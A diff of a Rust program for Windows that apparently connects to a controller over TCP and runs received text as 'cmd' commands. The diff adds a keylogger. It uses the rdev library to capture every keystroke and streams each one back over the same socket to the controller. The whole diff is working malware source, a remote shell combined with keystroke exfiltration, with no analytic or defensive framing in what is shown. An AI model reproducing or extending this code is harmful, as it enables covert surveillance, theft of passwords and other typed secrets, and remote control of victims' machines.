@@ -1,26 +1,40 @@
-use tokio::io::{self, AsyncReadExt};
+use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
+use tokio::sync::mpsc;
+use tokio::task;
 use tokio::net::TcpStream;
 use std::process::Command;
 use std::os::windows::process::CommandExt;
+use rdev::{Event, listen};
 
 #[tokio::main]
 async fn main() -> io::Result<()> {
     let socket = TcpStream::connect("127.0.0.1:7878").await?;
-    let (mut rd, mut _wr) = io::split(socket);
+    let (mut rd, mut wr) = io::split(socket);
+    let (sender, mut receiver) = mpsc::channel(8);
 
-    /* 
-    // Write data in the background
+    let rt = tokio::runtime::Runtime::new()?;
+    let _guard = rt.enter();
+
+    task::spawn_blocking( || {
+        let callback = move |event: Event| {
+            match event.name {
+                Some(string) => sender.blocking_send(string).expect(""),
+                None => (),
+            }
+        };
+
+        if let Err(error) = listen(callback) {
+            println!("{:?}", error);
+        }
+    });
+
     tokio::spawn(async move {
+        while let Some(string) = receiver.recv().await {
+            wr.write_all(string.as_bytes()).await?;
+        }
 
-
-        // Explicitly shut down the write half to signal EOF to the peer;
-        // `io::split` does not close the connection on drop.
-        wr.shutdown().await?;
-
-        // Sometimes, the rust type inferencer needs
-        // a little help
         Ok::<_, io::Error>(())
-    }); */
+    });
 
     let mut buf = vec![0; 256];
 
@@ -32,7 +46,7 @@ async fn main() -> io::Result<()> {
         }
 
         let command = std::str::from_utf8(&buf[..n]);
-
+        
         match command {
             Ok(command) => {
                 Command::new("cmd")
